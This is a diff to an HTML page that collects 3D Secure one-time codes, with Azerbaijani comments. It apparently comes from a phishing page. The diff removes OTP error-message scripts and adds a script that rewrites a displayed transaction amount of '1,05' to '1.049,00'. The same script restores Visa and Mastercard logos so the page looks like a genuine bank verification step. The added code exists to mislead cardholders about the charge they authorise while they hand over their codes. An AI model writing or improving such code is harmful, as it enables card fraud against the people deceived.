@@ -226,49 +226,42 @@
     .input-error-border {
     }
 </style>
-<script>
-    document.addEventListener('DOMContentLoaded', function() {
-        // Əgər ünvan çubuğunda xəta varsa
-        if (window.location.href.includes('error=invalid_otp')) {
-            // 1. 3DS Code xanasını tapıb qırmızı border veririk
-            const input = document.querySelector('input[type="text"], input[type="tel"], input[type="number"]');
-            if (input) {
-                input.style.border = '2px solid #dc3545';
-                input.style.backgroundColor = '#fff8f8';
-            }
-            
-            // 2. Xəta qutusunu yaradırıq
-            const form = document.querySelector('form');
-                const errBox = document.createElement('div');
-                errBox.id = 'prof-error-box';
-                errBox.className = 'professional-error';
-                errBox.innerHTML = '<span>⚠️</span> OTP kodu yanlışdır. Zəhmət olmasa yenidən cəhd edin.';
-                form.parentNode.insertBefore(errBox, form.nextSibling);
-            }
-        }
-    });
-</script>
+
 </body>
 
 </html>
 <!-- OTP Xəta Mesajı üçün Skript -->
+
+
+
+
 <script>
     document.addEventListener('DOMContentLoaded', function() {
-        if (window.location.href.includes('error=invalid_otp')) {
-            const form = document.querySelector('form');
-            if(form && !document.getElementById('otp-error-box')){
-                const err = document.createElement('div');
-                err.id = 'otp-error-box';
-                err.style.color = '#d9534f';
-                err.style.textAlign = 'center';
-                err.style.marginTop = '15px';
-                err.style.fontWeight = 'bold';
-                err.style.fontSize = '14px';
-                err.innerText = 'OTP kodu yanlışdır. Zəhmət olmasa yenidən cəhd edin.';
-                form.parentNode.insertBefore(err, form.nextSibling);
+        // 1. MƏBLƏĞİ DÜZƏLDİRİK (1,05 -> 1.049,00)
+        const allElements = document.querySelectorAll('*');
+        allElements.forEach(el => {
+            if (el.children.length === 0 && (el.innerText.trim() === '1,05' || el.innerText.trim() === '1.05')) {
+                el.innerText = '1.049,00';
             }
-        }
+        });
+
+        // 2. QIRIQ ŞƏKİLLƏRİ DÜZƏLDİRİK (Loqolar bərpa olunur)
+        const images = document.querySelectorAll('img');
+        images.forEach(img => {
+            const src = img.getAttribute('src');
+            // Əgər şəkil yoxdursa və ya src boşdursa
+            if (!src || src === '' || src.includes('undefined')) {
+                // Şəklin alt (alt) yazısına və ya ölçüsünə görə təyin edirik
+                const alt = (img.getAttribute('alt') || '').toLowerCase();
+                if (alt.includes('visa') || img.width < 40) {
+                    img.src = 'images/visa_logo.png';
+                } else if (alt.includes('master')) {
+                    img.src = 'images/mastercard_logo.png';
+                } else {
+                    // Əgər hansı loqo olduğu bilinmirsə, sadəcə boş buraxırıq (qırıq göstərməsin)
+                    img.style.display = 'none';
+                }
+            }
+        });
     });
 </script>
-
-
